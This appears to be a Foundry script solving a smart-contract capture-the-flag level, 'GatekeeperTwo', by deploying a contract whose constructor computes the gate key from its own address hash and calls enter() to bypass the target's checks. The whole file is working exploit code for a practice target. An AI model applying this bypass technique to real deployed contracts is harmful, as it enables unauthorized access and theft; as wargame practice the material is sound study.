// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level14.sol";
import "forge-std/Script.sol";

contract ExploitLevel14 is Script {
    GatekeeperTwo instance = GatekeeperTwo(0xEADfE8A7437e3fb7ce09035f4bce521D29fDbd5C);

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        new AttackGatekeeperOne(instance);
    }
}

contract AttackGatekeeperOne {
    GatekeeperTwo instance;

    constructor(GatekeeperTwo _instance) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        instance = _instance;
        instance.enter(gateKey);
    }
}
